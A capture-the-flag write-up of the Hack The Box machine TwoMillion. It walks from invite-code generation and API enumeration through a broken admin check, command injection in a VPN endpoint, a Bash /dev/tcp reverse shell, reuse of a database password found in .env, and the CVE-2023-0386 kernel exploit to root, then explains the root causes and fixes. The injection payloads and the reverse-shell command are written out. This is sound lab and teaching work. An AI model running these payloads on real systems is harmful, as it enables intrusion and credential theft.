---
title: "HTB TwoMillion Walkthrough"
author: sh1nn
date: 2026-02-21
tags:
  - ctf-writeup
  - hackthebox
  - broken-authorization
  - command-injection
  - privilege-escalation
description: "A technical walkthrough of Hack The Box TwoMillion, covering invite-code generation, authenticated API enumeration, broken authorization, command injection, credential reuse, and CVE-2023-0386."
cover: images/twomillion/2million.png
draft: false
toc: true
---

# Hack The Box: TwoMillion Writeup

> **Machine:** TwoMillion  
> **Operating system:** Linux  
> **Difficulty:** Easy  
> **Main techniques:** JavaScript deobfuscation, API enumeration, broken authorization, OS command injection, credential reuse, and Linux kernel privilege escalation.

> **Legal notice:** This writeup applies only to the retired Hack The Box machine and systems where testing is explicitly authorized.

## Overview

TwoMillion recreates an older version of the Hack The Box platform. The attack begins by reversing the invite-code workflow, continues through an authenticated API authorization flaw, and ends with a Linux kernel exploit.

```text
JavaScript deobfuscation
        ↓
Invite-code generation
        ↓
Authenticated API enumeration
        ↓
Broken authorization
        ↓
Administrative API access
        ↓
OS command injection
        ↓
Shell as www-data
        ↓
Credentials recovered from .env
        ↓
SSH access as admin
        ↓
CVE-2023-0386
        ↓
Root shell
```

In this machine, several individually simple weaknesses form a complete compromise chain.

## Techniques Covered

- How to inspect and deobfuscate client-side JavaScript.
- How to enumerate an authenticated REST API.
- How changes in API error messages can reveal request requirements.
- How broken function-level authorization can expose administrative actions.
- How unsafe shell command construction leads to command injection.
- How credential reuse enables lateral movement.
- How to validate and exploit a vulnerable Linux kernel in a controlled lab.

## 1. Initial Enumeration

### 1.1 Nmap scan

Start with a default script and service-version scan:

```bash
nmap -sC -sV -Pn 10.129.5.245
```

The scan identifies SSH on port 22 and HTTP on port 80. The web server redirects requests to `2million.htb`.

![Nmap service and version scan](/images/twomillion/01-nmap-scan.png)

Add the virtual host to `/etc/hosts`:

```bash
echo '10.129.5.245 2million.htb' | sudo tee -a /etc/hosts
```

### 1.2 Web application review

Opening `http://2million.htb` reveals an older version of the Hack The Box platform. The site provides login and registration functionality, but registration requires an invite code.

![TwoMillion invite page](/images/twomillion/02-invite-page.png)

The invite page is available at:

```text
http://2million.htb/invite
```

## 2. Reverse Engineering the Invite Workflow

### 2.1 Inspecting the page source

The invite page loads an obfuscated JavaScript file:

```html
<script defer src="/js/inviteapi.min.js"></script>
```

![Invite page source loading inviteapi.min.js](/images/twomillion/03-invite-script-source.png)

![Deobfuscate script](/images/twomillion/04-deobfuscated-javascript.png)

After formatting or deobfuscating the script, two useful functions become visible:

```javascript
function verifyInviteCode(code) {
  const formData = { code: code };

  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: "/api/v1/invite/verify",
    success: function (response) {
      console.log(response);
    },
    error: function (response) {
      console.log(response);
    },
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: "/api/v1/invite/how/to/generate",
    success: function (response) {
      console.log(response);
    },
    error: function (response) {
      console.log(response);
    },
  });
}
```

The second function reveals the following endpoint:

```http
POST /api/v1/invite/how/to/generate
```

Although the script is obfuscated, the underlying API routes and workflow remain recoverable from the client-side code.

### 2.2 Requesting invite-generation instructions

Send a POST request to the discovered endpoint:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/how/to/generate | jq
```

![Invite-generation instructions returned by the API](/images/twomillion/how-to-generate.png)

The response contains a ROT13-encoded message. It can be decoded locally:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/how/to/generate \
  | jq -r '.data.data' \
  | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

![Decode ROT13](/images/twomillion/decode-rot13.png)

The decoded message instructs us to send a POST request to:

```http
POST /api/v1/invite/generate
```

### 2.3 Generating the invite code

Request a new invite code:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/generate | jq
```

The returned code is Base64-encoded. Decode it with:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/generate \
  | jq -r '.data.code' \
  | base64 -d
```

![Generated and decoded invite code](/images/twomillion/decode-base64.png)

Submit the decoded value on `/invite`, then register a normal user account.

![TwoMillion account registration](/images/twomillion/07-registration.png)

## 3. Authenticated API Enumeration

### 3.1 Capturing the session cookie

After logging in, the application creates a PHP session cookie named `PHPSESSID`. Capture it with Burp Suite or the browser developer tools.

![PHP session cookie captured in Burp Suite](/images/twomillion/08-session-cookie.png)

The site's **Access** page downloads a VPN configuration through an authenticated API request similar to:

```http
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=<SESSION_ID>
```

This confirms that the application exposes an authenticated API under `/api/v1`.

### 3.2 Discovering available routes

Request the API root while supplying the session cookie:

```bash
curl -s \
  http://2million.htb/api/v1 \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

![API v1 route listing](/images/twomillion/09-api-routes.png)

The response exposes both user and administrative endpoints, including:

```text
GET  /api/v1/admin/auth
POST /api/v1/admin/vpn/generate
PUT  /api/v1/admin/settings/update
```

The route listing makes reconnaissance easier. In this case, the administrative routes remain reachable because the authorization check is implemented incorrectly.

### 3.3 Confirming the current role

Check whether the current account is an administrator:

```bash
curl -s \
  http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

The response confirms that the account is currently a normal user:

```json
{
  "message": false
}
```

## 4. Escalating the Web Account to Administrator

### 4.1 Probing the settings endpoint

The route listing shows that `/api/v1/admin/settings/update` expects a `PUT` request. Start with an empty request:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Instead of returning `401 Unauthorized`, the endpoint complains about the content type. This indicates that the request reached the handler even though the account is not an administrator.

Set the expected content type:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' | jq
```

The API reports a missing `email` parameter. Supplying the email reveals another required field named `is_admin`.

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<YOUR_EMAIL>"}' | jq
```

### 4.2 Modifying the role

Send both required values and set `is_admin` to the integer `1`:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<YOUR_EMAIL>","is_admin":1}' | jq
```

![Normal account promoted to administrator](/images/twomillion/10-admin-escalation.png)

Verify the new role:

```bash
curl -s \
  http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Expected response:

```json
{
  "message": true
}
```

The normal account has now been promoted to administrator through broken function-level authorization.

## 5. Foothold Through Command Injection

### 5.1 Testing the administrative VPN endpoint

The administrative VPN endpoint requires a `username` parameter:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test"}'
```

A normal value returns an OpenVPN configuration. This suggests that the username is used while generating or reading a file on the operating system.

### 5.2 Confirming command execution

Test whether shell metacharacters are interpreted:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test;id;"}'
```

![Command injection confirmed with the id command](/images/twomillion/11-command-injection.png)

The response includes:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms OS command injection as the `www-data` user. The issue maps to **CWE-78: Improper Neutralization of Special Elements Used in an OS Command**.

### 5.3 Receiving a reverse shell

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Generate a Base64-encoded Bash reverse-shell payload:

```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4444 0>&1' | base64 | tr -d '\n'
```

Send the request:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
--cookie "<PHPSESSID>" \
-H "Content-Type: application/json" \
--data '{"username":"test;echo <BASE64_PAYLOAD> | base64 -d | bash;"}'
```

![Reverse shell received as www-data](/images/twomillion/12-reverse-shell.png)

The listener receives a shell as `www-data`.

## 6. Lateral Movement to the `admin` User

### 6.1 Reading the application environment file

The web root contains a `.env` file:

```bash
cd /var/www/html
ls -la
cat .env
```

![Application environment file containing database credentials](/images/twomillion/13-env-credentials.png)

The file contains database credentials:

```text
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Check whether a local operating-system account named `admin` exists:

```bash
cat /etc/passwd | grep admin
```

Result:

```text
admin:x:1000:1000::/home/admin:/bin/bash
```

### 6.2 Password reuse

The database password is reused by the local `admin` account. From the attacking machine, connect over SSH:

```bash
ssh admin@2million.htb
```

Use the password recovered from `.env`, then verify the account:

```bash
id
cat ~/user.txt
```

![SSH access as the admin user](/images/twomillion/14-ssh-admin.png)

The credential recovered from `.env` is also accepted by the local `admin` account, which provides the path from the web shell to SSH access.

## 7. Linux Privilege Escalation

### 7.1 Reading local mail

Inspect the local mailbox:

```bash
cat /var/mail/admin
```

![Local mail hinting at an OverlayFS and FUSE vulnerability](/images/twomillion/15-local-mail.png)

The message warns about recent Linux kernel vulnerabilities and specifically references OverlayFS and FUSE. This is a strong hint toward **CVE-2023-0386**.

### 7.2 Checking the kernel and distribution

Enumerate the running kernel:

```bash
uname -a
```

![Linux kernel version enumeration](/images/twomillion/16-kernel-version.png)

Check the distribution release:

```bash
lsb_release -a
```

![Ubuntu Jammy release information](/images/twomillion/17-os-release.png)

Relevant system information:

```text
Kernel: 5.15.70-051570-generic
Distribution: Ubuntu 22.04.2 LTS
Codename: jammy
```

The local mail, kernel version, and distribution release together justify investigating CVE-2023-0386.

### 7.3 Preparing the proof of concept

On the attacking machine, clone and compress the proof of concept:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
zip -r cve.zip CVE-2023-0386
```

Upload it through SSH:

```bash
scp cve.zip admin@2million.htb:/tmp/
```

On the target:

```bash
cd /tmp
unzip cve.zip
cd CVE-2023-0386
make all
```

Compiler warnings may be displayed, but the required binaries should still be produced in the HTB lab environment.

### 7.4 Running the exploit

Start the FUSE component in the background:

```bash
./fuse ./ovlcap/lower ./gc &
```

Run the exploit binary:

```bash
./exp
```

Verify the effective user:

```bash
id
```

Expected result:

```text
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

Read the root flag:

```bash
cat /root/root.txt
```

![Root shell obtained after exploiting CVE-2023-0386](/images/twomillion/18-root-shell.png)

## 8. Post-Exploitation Root-Cause Analysis

> The following source snippets are included as post-exploitation analysis based on the official walkthrough. They explain why the observed behavior occurred; they were not required to be available during the initial exploitation process.

### 8.1 Broken authorization

The vulnerable controller performs an authorization check similar to:

```php
$isAdmin = $this->is_admin($router);

if (!$isAdmin) {
    return header("HTTP/1.1 401 Unauthorized");
}
```

However, `is_admin()` returns JSON instead of a Boolean:

```php
return json_encode(["message" => false]);
```

The returned value is a non-empty string:

```text
{"message":false}
```

In PHP, a non-empty string is truthy. Therefore, `!$isAdmin` evaluates to `false`, and execution continues even though the JSON message says the user is not an administrator.

The behavior occurs because the helper returns a JSON string rather than a Boolean value. Returning a Boolean would prevent the non-empty string from bypassing the condition.

```php
private function currentUserIsAdmin(): bool
{
    // Return true or false.
}
```

### 8.2 OS command injection

The vulnerable code builds a shell command with untrusted input:

```php
$output = shell_exec(
    "/usr/bin/cat /var/www/html/VPN/user/$username.ovpn"
);
```

If `username` contains a shell separator such as `;`, the shell interprets the remaining text as another command.

The injection occurs because `$username` is interpolated into a command executed by the shell. Replacing the shell call with direct file access removes shell interpretation from this code path.

```php
$path = "/var/www/html/VPN/user/" . $safeUsername . ".ovpn";
$output = file_get_contents($path);
```

A username allowlist would also restrict the accepted input format:

```regex
^[A-Za-z0-9_-]{1,32}$
```

## 19. Vulnerability Summary

| Stage                | Weakness                                          | Impact                                 | Classification                            |
| -------------------- | ------------------------------------------------- | -------------------------------------- | ----------------------------------------- |
| Invite workflow      | Client-callable invite-generation workflow        | Account registration                   | Insecure design / reconnaissance exposure |
| Role escalation      | Authorization helper returns a truthy JSON string | Normal user becomes administrator      | Broken Function Level Authorization       |
| VPN generation       | Untrusted username reaches `shell_exec()`         | Remote command execution as `www-data` | CWE-78                                    |
| Lateral movement     | Database credentials reused for a local account   | SSH access as `admin`                  | Credential reuse                          |
| Privilege escalation | Vulnerable Linux kernel                           | Root access                            | CVE-2023-0386                             |

## 10. Notes on the Vulnerabilities

### Authorization behavior

The authorization issue results from a JSON string being evaluated as a Boolean value. Because the returned string is non-empty, the condition does not behave as intended.

### Command execution path

The command-injection path exists because the supplied username is interpolated into a command processed by the shell. Direct file access would avoid shell interpretation in this code path.

### Credential reuse

Lateral movement is possible because the database credential recovered from `.env` is also valid for the local `admin` account.

### Kernel state

Root access depends on the vulnerable kernel version running on the target. The local mail, operating-system release, and kernel version together point toward CVE-2023-0386.

## 11. Conclusion

TwoMillion follows a clear compromise chain: the invite workflow exposes an account-registration path, the authenticated API contains a broken authorization check, and the administrative VPN endpoint is vulnerable to command injection.

The resulting `www-data` shell exposes credentials in the application environment. Password reuse provides SSH access as `admin`, and the vulnerable kernel finally allows privilege escalation to root.

The most interesting part for me was the API enumeration stage. Each change in the response revealed another requirement, including the expected content type, parameter names, and accepted data types. These responses made it possible to infer how far each request progressed through the handler.

## Acknowledgements

Thanks to Hack The Box and everyone involved in creating TwoMillion. Working through this machine and reviewing the official material helped me better understand the full attack chain and the vulnerabilities behind it.

Thanks for taking the time to read my writeup.

## References

- [CVE-2023-0386 proof of concept by xkaneiki](https://github.com/xkaneiki/CVE-2023-0386)
- [OWASP API Security — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [CWE-78 — Improper Neutralization of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- Hack The Box official TwoMillion walkthrough
